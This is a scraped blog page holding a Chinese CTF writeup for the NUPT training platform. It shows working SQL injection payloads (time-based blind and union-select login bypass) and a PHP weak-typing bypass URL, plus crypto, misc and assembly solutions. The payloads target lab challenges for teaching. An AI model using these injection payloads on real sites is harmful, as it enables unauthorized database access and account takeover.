is TRUE (expr1 \u003c\u003e 0 and expr1 \u003c\u003e NULL), IF() returns expr2. Otherwise, it returns expr3.*/ SLEEP(duration) /*Sleeps (pauses) for the number of seconds given by the duration argument, then returns 0.If SLEEP() is interrupted, it returns 1. The duration may have a fractional part.*/ 所以构造post数据\n1 user=admin' and if(mid(pw,1,1)\u003e'9',sleep(2),1)#\u0026pass=blabla 如果if()函数的expr1正确，页面响应就会延时两秒，否则不会，以此为依据采用二分法调整。\npw字段的取值范围为/[\\da-e]/，\n最后注处字段值为21dd715a3605b2a4053e80387116c190，即md5('njupt')\n然后postuser=admin\u0026pass=njupt即可。\nindex.phps藏源码。\n1 2 3 查到另一种简单的做法，即post如下数据 user=' union select '45cf93bd4f762c6597b68e615b153bd0'#\u0026pass=findneo 其中'45cf93bd4f762c6597b68e615b153bd0'即md5('findneo') 这才是出题者的本意。我觉得这个做法很妙，看似理所当然的代码逻辑实际上不堪一击。\n综合题2 非xss题 但是欢迎留言~ 地址：get the flag\nflag:nctf{you_are_s0_g00d_hacker}\n详见南邮CTF平台综合题2writeup\n注入实战一 请使用firefox浏览器，并安装hackbar插件（自行百度并熟悉） 目标网址：地址 flag为管理员密码的32位md5(小写) 并且加上nctf{}\n手注教程群里面发过。 看不懂的话自行百度\"mysql手动注入\"查阅相关文章\nPS:用sqlmap等工具做的就不要厚脸皮提交了\n题目貌似坏了，放个 4ct10n 的解答吧。\n密码就在上图BSCmarketing24 然后再md5加密成 f3d6cc916d0739d853e50bc92911dddb flag: nctf{f3d6cc916d0739d853e50bc92911dddb}\n密码重置2 题题被秒，当时我就不乐意了！ 本题来源于CUMT 题目链接\nTIPS: 1.管理员邮箱观察一下就可以找到 2.linux下一般使用vi编辑器，并且异常退出会留下备份文件。(用vim编辑则不会) 3.弱类型bypass\nnctf{thanks_to_cumt_bxs}\n1、按照提示，源码中看到管理员邮箱为admin@nuptzj.cn ；\n2、wget http://nctf.nuptzj.cn/web14/.submit.php.swp ；\n3、vi -r .submit.php.swp\n1 2 3 4 5 6 7 8 9 10 11 12 13 if(!empty($token)\u0026\u0026!empty($emailAddress)){ if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = \"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'\"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r\u003e0){ echo $flag; }else{ echo \"失败了呀\"; } } 要求token长度为10且token!='0'为假，可利用弱类型（含有数字内容的字符串也会被转换类型，所以'0e123'=='0'值为真）绕过，访问 http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin%40nuptzj.cn\u0026token=0e12345678 即可。\nMISC 图种 flag是动态图最后一句话的拼音首字母 加上nctf{}\nnctf{dssdcmlw}\nbinwalk -e 555.gif分离出一张233333.gif，动态图的最后一帧的最后一句话是 都深深的出卖了我\n丘比龙De女神 丘比龙是丘比特的弟弟，由于吃了太多的甜甜圈导致他飞不动了！\n没错 里面隐藏了一张女神的照片 flag是照片文件的md5值(小写) 记住加上flag{}\n文件尾有nvshen.jpg字样，故搜索字符串nvshen，共出现两次，猜测从第一次出现位置上方的love起到文件末尾为一个密码为love的压缩包，复制出来后修改6C6F7665 为504b0304 ,解压得到女神的照片。\nflag{a6caad3aaafa11b6d5ed583bef4d8a54}\n密码学 easy! 密文：bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9 这题做不出来就剁手吧！\nnctf{this_is_base64_encode}\n在Linux命令行输入 echo bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9 | base64 -d即可\nkeyboard 看键盘看键盘看键盘！ 答案非标准格式，提交前加上nctf{} ytfvbhn tgbgy hjuygbn yhnmki tgvhn uygbnjm uygbn yhnijm\n观察题干字符串在键盘上的位置构成的轨迹。\nnctf{areuhack}\nbase64全家桶 全家桶全家桶全家桶！ 我怎么饿了。。。。。。 密文(解密前删除回车)：\nR1pDVE1NWlhHUTNETU4yQ0dZWkRNTUpYR00zREtNWldHTTJES 1JSV0dJM0RDTlpUR1kyVEdNWlRHSTJVTU5SUkdaQ1RNTkJWSVk zREVOUlJHNFpUTU5KVEdFWlRNTjJF\n按base64、base32、base16的顺序解码一遍即可。\nnctf{base64 _ base32_and_base16}\nn次base64 1 2 3 4 5 import base64 as b s='**' while 1: s=b.b64decode(s) print s nctf{please_use_python_to_decode_base64}\n骚年来一发吗 密文：iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas\n1 2 3 4 5 6 7 8 9 10 function encode($str){ $_o=strrev($str); for($_0=0;$_0\u003cstrlrn($_o),$_0++){ $_c=substr($_o,$_0,1); $__=ord($_c)+1; $_c=chr($__); $_=$_.$_c; } return str_rot13(strrev(base64_encode($_))); } encode函数先反转明文字符串，再逐字符加一，然后base64编码，再反转，再rot13，然后返回加密后的字符串。\n1 2 3 4 5 6 7 8 9 10 11 \u003c?php $s=\"iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas\"; function decode($str){ $strtmp=base64_decode(strrev(str_rot13($str))); $res=''; for($i=0;$i\u003cstrlen($strtmp);$i++){ $res.=chr(ord(substr($strtmp, $i,1))-1); } return strrev($res); } echo decode($s); nctf{rot13and_base64and_strrev}\nmixed base64 多重base64加密，干(sang)得(xin)漂(bing)亮(kuang)!\n1 2 3 4 5 6 7 8 9 10 11 12 13 import random from base64 import * result={ '16':lambda x:b16encode(x), '32':lambda x:b32encode(x), '64':lambda x:b64encode(x) } flag=b\"{nctf{***}\" for i in range(10): a=random.choice(['16','32','64']) flag=result[a](flag) with open(\"code.txt\",'wb')as f: f.write(flag) 解码代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from base64 import b64decode, b32decode, b16decode with open('code.txt', 'r') as f: c = f.read() def trys(s): for f in [b64decode, b32decode, b16decode]: try: t = f(s) if t[:4] == \"nctf\": print t return 0 else: trys(t) except: pass trys(c) nctf{random_mixed_base64_encode}\n异性相吸 同性真爱，异性相吸都是假的！ （题目要求，我是直的）\n解密压缩文件里的内容\nTIPS: 1.xor 2.hex2binary 3.len(bin(miwen))==len(bin(mingwen))\n1 2 3 4 5 6 c=open('密文.txt').read() p=open('明文.txt').read() s='' for i in range(len(c)): s+=chr(ord(c[i])^ord(p[i])) print s nctf{xor_xor_xor_biubiubiu}\nMD5 python大法好！ 这里有一段丢失的md5密文 e9032???da???08????911513?0???a2 要求你还原出他并且加上nctf{}提交\n已知线索 明文为： TASC?O3RJMV?WDJKX?ZM\n题目来源：安恒杯\n1 2 3 4 5 6 7 8 9 10 11 12 import hashlib pool = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ' s0 = 'TASC?O3RJMV?WDJKX?ZM' ss = s0.split('?') m = 'e9032???da???08????911513?0???a2' for i in pool: for j in pool: for k in pool: s = ss[0] + i + ss[1] + j + ss[2] + k + ss[3] if hashlib.md5(s).hexdigest()[:5] == m[:5]: print s, hashlib.md5(s).hexdigest() break nctf{e9032994dabac08080091151380478a2}\nVigenere It is said that Vigenere cipher does not achieve the perfect secrecy actually :-)\nTips: 1.The encode pragram is given; 2.Do u no index of coincidence ？ 3.The key is last 6 words of the plain text(with “nctf{}” when submitted, also without any interpunction)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 http://ctf.nuptsast.com/static/uploads/13706e3281c1fb0c04417d3452cb745b/encode.cpp #include #define KEY_LENGTH 2 // Can be anything from 1 to 13 main(){ unsigned char ch; FILE *fpIn, *fpOut; int i; unsigned char key[KEY_LENGTH] = {0x00, 0x00}; /* of course, I did not use the all-0s key to encrypt */ fpIn = fopen(\"ptext.txt\", \"r\"); fpOut = fopen(\"ctext.txt\", \"w\"); i=0; while (fscanf(fpIn, \"%c\", \u0026ch) != EOF) { /* avoid encrypting newline characters */ /* In a \"real-world\" implementation of the Vigenere cipher, every ASCII character in the plaintext would be encrypted. However, I want to avoid encrypting newlines here because it makes recovering the plaintext slightly more difficult... */ /* ...and my goal is not to create \"production-quality\" code =) */ if (ch!='\\n') { fprintf(fpOut, \"%02X\", ch ^ key[i % KEY_LENGTH]); // ^ is logical XOR i++; } } fclose(fpIn); fclose(fpOut); return; } ---------------------------------------------------------------------------------- http://ctf.nuptsast.com/static/uploads/9a27a6c8b9fb7b8d2a07ad94924c02e5/code.txt F96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923CAB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84CC931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D963FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47EFD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63CED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A85A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794 详见 南邮CTF平台 Vigenere writeup 。\n逆向 Hello,RE! 或许你需要去学习下IDA的使用，但是只需要学一点点就能做这题了 PS:IDA里面按R可以把奇怪的数字变成字符串\n格式为flag{*****}包含flag{}提交\n参考资料： 《IDA Pro 权威指南》 各种CTF比赛的逆向部分的writeup\n1.exe\n拖进IDA，定位到main函数，按F5反编译。对着V5~V10逐个按R将十六进制转为字符串即可。flag{Welcome_To_RE_World!}\nReadAsm2 读汇编是逆向基本功。\n给出的文件是func函数的汇编 main函数如下 输出的结果即为flag，格式为flag{**********}，请连flag{}一起提交\n编译环境为linux gcc x86-64 调用约定为System V AMD64 ABI 请不要利用汇编器，IDA等工具。。这里考的就是读汇编与推算汇编结果的能力\n1 2 3 4 5 6 7 8 9 int main(int argc, char const *argv[]) { char input[] = {0x0, 0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c}; func(input, 28); printf(\"%s\\n\",input+1); return 0; } 参考资料: https://github.com/veficos/reverse-engineering-for-beginners 《汇编语言》王爽 《C 反汇编与逆向分析技术揭秘》\n2.asm :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 00000000004004e6 : 4004e6: 55 push rbp 4004e7: 48 89 e5 mov rbp,rsp 4004ea: 48 89 7d e8 mov QWORD PTR [rbp-0x18],rdi 4004ee: 89 75 e4 mov DWORD PTR [rbp-0x1c],esi 4004f1: c7 45 fc 01 00 00 00 mov DWORD PTR [rbp-0x4],0x1 4004f8: eb 28 jmp 400522 4004fa: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] 4004fd: 48 63 d0 movsxd rdx,eax 400500: 48 8b 45 e8 mov rax,QWORD PTR [rbp-0x18] 400504: 48 01 d0 add rax,rdx 400507: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] 40050a: 48 63 ca movsxd rcx,edx 40050d: 48 8b 55 e8 mov rdx,QWORD PTR [rbp-0x18] 400511: 48 01 ca add rdx,rcx 400514: 0f b6 0a movzx ecx,BYTE PTR [rdx] 400517: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] 40051a: 31 ca xor edx,ecx 40051c: 88 10 mov BYTE PTR [rax],dl 40051e: 83 45 fc 01 add DWORD PTR [rbp-0x4],0x1 400522: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] 400525: 3b 45 e4 cmp eax,DWORD PTR [rbp-0x1c] 400528: 7e d0 jle 4004fa 40052a: 90 nop 40052b: 5d pop rbp 40052c: c3 ret ","wordCount":"2870","inLanguage":"en","datePublished":"2017-09-24T11:06:34+08:00","dateModified":"2017-09-24T11:06:34+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2neo.cn/post/170924nuptctfwp/"},"publisher":{"@type":"Organization","name":"闲言语","logo":{"@type":"ImageObject","url":"https://ret2neo.cn/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ret2neo.cn/ accesskey=h title="闲言语 (Alt + H)">闲言语</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://ret2neo.cn/mind/ title=随笔><span>随笔</span></a></li><li><a href=https://ret2neo.cn/about title=关于><span>关于</span></a></li><li><a href=https://ret2neo.cn/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>南京邮电大学网络攻防训练平台writeup</h1><div class=post-description>这是个不错的平台，学到了一些，也发现了更多需要深入学习的东西。</div><div class=post-meta><span title='2017-09-24 11:06:34 +0800 CST'>September 24, 2017</span>&nbsp;|&nbsp;<a href=https://github.dev/findneo/priblog/content/post/170924nuptctfwp.md rel="noopener noreferrer" target=_blank>edit</a></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><ul><li><a href=#web aria-label=WEB>WEB</a><ul><li><a href=#%e7%ad%be%e5%88%b0%e9%a2%98httpchinaloversinaappcomweb1 aria-label=签到题><a href=http://chinalover.sinaapp.com/web1/>签到题</a></a></li><li><a href=#md5-collisionhttpchinaloversinaappcomweb19 aria-label="md5 collision"><a href=http://chinalover.sinaapp.com/web19/>md5 collision</a></a></li><li><a href=#%e7%ad%be%e5%88%b02httpteamxlcsinaappcomweb102298884f0724c04293b4d8c0178615eindexphp aria-label=签到2><a href=http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php>签到2</a></a></li><li><a href=#%e8%bf%99%e9%a2%98%e4%b8%8d%e6%98%afwebhttpchinaloversinaappcomweb2indexhtml aria-label=这题不是WEB><a href=http://chinalover.sinaapp.com/web2/index.html>这题不是WEB</a></a></li><li><a href=#%e5%b1%82%e5%b1%82%e9%80%92%e8%bf%9bhttpchinaloversinaappcomweb3 aria-label=层层递进><a href=http://chinalover.sinaapp.com/web3/>层层递进</a></a></li><li><a href=#aaencodehttpchinaloversinaappcomweb20aaencodetxt aria-label=AAencode><a href=http://chinalover.sinaapp.com/web20/aaencode.txt>AAencode</a></a></li><li><a href=#%e5%8d%95%e8%ba%ab%e4%ba%8c%e5%8d%81%e5%b9%b4httpchinaloversinaappcomweb8 aria-label=单身二十年><a href=http://chinalover.sinaapp.com/web8/>单身二十年</a></a></li><li><a href=#%e4%bd%a0%e4%bb%8e%e5%93%aa%e9%87%8c%e6%9d%a5httpchinaloversinaappcomweb22 aria-label=你从哪里来><a href=http://chinalover.sinaapp.com/web22/>你从哪里来</a></a></li><li><a href=#php-decode aria-label="php decode">php decode</a></li><li><a href=#%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%abhttp4chinaloversinaappcomweb7indexphp aria-label=文件包含><a href=http://4.chinalover.sinaapp.com/web7/index.php>文件包含</a></a></li><li><a href=#%e5%8d%95%e8%ba%ab%e4%b8%80%e7%99%be%e5%b9%b4%e4%b9%9f%e6%b2%a1%e7%94%a8httpchinaloversinaappcomweb9 aria-label=单身一百年也没用><a href=http://chinalover.sinaapp.com/web9/>单身一百年也没用</a></a></li><li><a href=#downloadhttpwaynuptzjcnweb6 aria-label=Download~!><a href=http://way.nuptzj.cn/web6/>Download~!</a></a></li><li><a href=#cookiehttpchinaloversinaappcomweb10indexphp aria-label=COOKIE><a href=http://chinalover.sinaapp.com/web10/index.php>COOKIE</a></a></li><li><a href=#mysqlhttpchinaloversinaappcomweb11 aria-label=MYSQL><a href=http://chinalover.sinaapp.com/web11/>MYSQL</a></a></li><li><a href=#sql-injection-3httpchinaloversinaappcomsql-gbkindexphpid1 aria-label="sql injection 3"><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">sql injection 3</a></a><ul><li><a href=#%e6%ad%a5%e9%aa%a4%e4%b8%80%e7%a1%ae%e8%ae%a4%e8%af%a5%e7%82%b9%e5%ad%98%e5%9c%a8%e6%b3%a8%e5%85%a5 aria-label=步骤一：确认该点存在注入>步骤一：确认该点存在注入</a></li><li><a href=#%e6%ad%a5%e9%aa%a4%e4%ba%8c%e6%9f%a5%e8%af%a2%e6%95%b0%e6%8d%ae%e5%ba%93%e5%90%8d aria-label=步骤二：查询数据库名>步骤二：查询数据库名</a></li><li><a href=#%e6%ad%a5%e9%aa%a4%e4%b8%89%e6%9f%a5%e8%af%a2%e5%90%8d%e4%b8%basae-chinalover%e7%9a%84%e6%95%b0%e6%8d%ae%e5%ba%93%e7%9a%84%e8%a1%a8%e7%9a%84%e6%95%b0%e9%87%8f%e5%92%8c%e5%90%8d%e5%ad%97 aria-label=步骤三：查询名为&amp;rsquo;sae-chinalover&amp;rsquo;的数据库的表的数量和名字>步骤三：查询名为&rsquo;sae-chinalover&rsquo;的数据库的表的数量和名字</a></li><li><a href=#%e6%ad%a5%e9%aa%a4%e5%9b%9b%e6%9f%a5%e8%af%a2%e8%a1%a8ctf4%e4%b8%ad%e7%9a%84flag aria-label=步骤四：查询表&amp;rsquo;ctf4&amp;rsquo;中的flag>步骤四：查询表&rsquo;ctf4&rsquo;中的flag</a></li></ul></li><li><a href=#x00httpteamxlcsinaappcomweb4f5a14f5e6e3453b78cd73899bad98d53indexphp aria-label=/x00><a href=http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php>/x00</a></a></li><li><a href=#bypass-againhttpchinaloversinaappcomweb17indexphp aria-label="bypass again"><a href=http://chinalover.sinaapp.com/web17/index.php>bypass again</a></a></li><li><a href=#%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96httpchinaloversinaappcomweb18indexphp aria-label=变量覆盖><a href=http://chinalover.sinaapp.com/web18/index.php>变量覆盖</a></a></li><li><a href=#php%e6%98%af%e4%b8%96%e7%95%8c%e4%b8%8a%e6%9c%80%e5%a5%bd%e7%9a%84%e8%af%ad%e8%a8%80httpwaynuptzjcnphpindexphp aria-label=PHP是世界上最好的语言><a href=http://way.nuptzj.cn/php/index.php>PHP是世界上最好的语言</a></a></li><li><a href=#%e4%bc%aa%e8%a3%85%e8%80%85 aria-label=伪装者>伪装者</a></li><li><a href=#headerhttpwaynuptzjcnweb5 aria-label=header><a href=http://way.nuptzj.cn/web5/>header</a></a></li><li><a href=#%e4%b8%8a%e4%bc%a0%e7%bb%95%e8%bf%87 aria-label=上传绕过>上传绕过</a></li><li><a href=#sql%e6%b3%a8%e5%85%a51 aria-label=sql注入1>sql注入1</a></li><li><a href=#pass-checkhttpchinaloversinaappcomweb21 aria-label="pass check"><a href=http://chinalover.sinaapp.com/web21/>pass check</a></a></li><li><a href=#%e8%b5%b7%e5%90%8d%e5%ad%97%e7%9c%9f%e9%9a%be aria-label=起名字真难>起名字真难</a></li><li><a href=#%e5%af%86%e7%a0%81%e9%87%8d%e7%bd%ae aria-label=密码重置>密码重置</a></li><li><a href=#php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96http11528150176php1indexphp aria-label=php反序列化><a href=http://115.28.150.176/php1/index.php>php反序列化</a></a></li><li><a href=#sql-injection4 aria-label="sql injection4">sql injection4</a></li><li><a href=#%e7%bb%bc%e5%90%88%e9%a2%98httpteamxlcsinaappcomweb3b0b0ad119f425408fc3d45253137d33dindexphp aria-label=综合题><a href=http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php>综合题</a></a></li><li><a href=#sql-%e6%b3%a8%e5%85%a52 aria-label="sql 注入2">sql 注入2</a></li><li><a href=#%e7%bb%bc%e5%90%88%e9%a2%982 aria-label=综合题2>综合题2</a></li><li><a href=#%e6%b3%a8%e5%85%a5%e5%ae%9e%e6%88%98%e4%b8%80 aria-label=注入实战一>注入实战一</a></li><li><a href=#%e5%af%86%e7%a0%81%e9%87%8d%e7%bd%ae2 aria-label=密码重置2>密码重置2</a></li></ul></li><li><a href=#misc aria-label=MISC>MISC</a><ul><li><a href=#%e5%9b%be%e7%a7%8d aria-label=图种>图种</a></li><li><a href=#%e4%b8%98%e6%af%94%e9%be%99de%e5%a5%b3%e7%a5%9e aria-label=丘比龙De女神>丘比龙De女神</a></li></ul></li><li><a href=#%e5%af%86%e7%a0%81%e5%ad%a6 aria-label=密码学>密码学</a><ul><li><a href=#easy aria-label=easy!>easy!</a></li><li><a href=#keyboard aria-label=keyboard>keyboard</a></li><li><a href=#base64%e5%85%a8%e5%ae%b6%e6%a1%b6 aria-label=base64全家桶>base64全家桶</a></li><li><a href=#n%e6%ac%a1base64httpchinaloversinaappcomdecode1base64txt aria-label=n次base64><a href=http://chinalover.sinaapp.com/decode1/base64.txt>n次base64</a></a></li><li><a href=#%e9%aa%9a%e5%b9%b4%e6%9d%a5%e4%b8%80%e5%8f%91%e5%90%97 aria-label=骚年来一发吗>骚年来一发吗</a></li><li><a href=#mixed-base64httpctfnuptsastcomstaticuploads3e5c0c7045f2a81363a45d97d69911e3codetxt aria-label="mixed base64"><a href=http://ctf.nuptsast.com/static/uploads/3e5c0c7045f2a81363a45d97d69911e3/code.txt>mixed base64</a></a></li><li><a href=#%e5%bc%82%e6%80%a7%e7%9b%b8%e5%90%b8httpctfnuptsastcomstaticuploads7ecc0dbd59f262e698b2dd94b39825bcbiubiubiuzip aria-label=异性相吸><a href=http://ctf.nuptsast.com/static/uploads/7ecc0dbd59f262e698b2dd94b39825bc/biubiubiu.zip>异性相吸</a></a></li><li><a href=#md5 aria-label=MD5>MD5</a></li><li><a href=#vigenere aria-label=Vigenere>Vigenere</a></li></ul></li><li><a href=#%e9%80%86%e5%90%91 aria-label=逆向>逆向</a><ul><li><a href=#hellore aria-label=Hello,RE!>Hello,RE!</a></li><li><a href=#readasm2 aria-label=ReadAsm2>ReadAsm2</a></li></ul></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><blockquote><p>南邮CTF平台网址：</p><ul><li><a href=http://ctf.nuptsast.com/challenges>http://ctf.nuptsast.com/challenges</a></li><li><a href=http://ctf.nuptzj.cn/challenges>http://ctf.nuptzj.cn/challenges</a></li></ul></blockquote><h3 id=web>WEB<a hidden class=anchor aria-hidden=true href=#web>#</a></h3><h4 id=签到题httpchinaloversinaappcomweb1><a href=http://chinalover.sinaapp.com/web1/>签到题</a><a hidden class=anchor aria-hidden=true href=#签到题httpchinaloversinaappcomweb1>#</a></h4><p><em>nctf{flag_admiaanaaaaaaaaaaa}</em></p><p>ctrl+u或右键查看源代码即可。在CTF比赛中，代码注释、页面隐藏元素、超链接指向的其他页面、HTTP响应头部都可能隐藏flag或提示信息。在渗透测试中，开发者留下的多余注释和测试页面有时也能提供线索。</p><h4 id=md5-collisionhttpchinaloversinaappcomweb19><a href=http://chinalover.sinaapp.com/web19/>md5 collision</a><a hidden class=anchor aria-hidden=true href=#md5-collisionhttpchinaloversinaappcomweb19>#</a></h4><p><em>nctf{md5_collision_is_easy}</em></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-12>12</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$md51 <span style=color:#f92672>=</span> <span style=color:#a6e22e>md5</span>(<span style=color:#e6db74>&#39;QNKCDZO&#39;</span>);
